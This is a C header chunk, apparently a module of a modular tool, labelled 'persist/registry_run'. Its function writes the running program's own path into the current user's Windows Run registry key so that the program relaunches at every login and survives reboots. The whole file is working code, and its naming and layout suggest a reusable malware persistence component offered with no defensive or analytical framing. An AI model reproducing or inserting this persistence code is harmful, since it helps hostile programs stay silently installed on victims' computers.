// chunk: persist/registry_run
// depends: (none)
// provides: persist_registry_run
// headers: windows.h
// note: Add to HKCU Run key — survives reboots, runs at login

#ifndef CHUNK_PERSIST_REGISTRY
#define CHUNK_PERSIST_REGISTRY

#include <windows.h>

static int persist_registry_run(const char *value_name) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
        return 0;

    LONG r = RegSetValueExA(hk, value_name, 0, REG_SZ,
                            (BYTE *)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hk);
    return r == ERROR_SUCCESS;
}

#endif
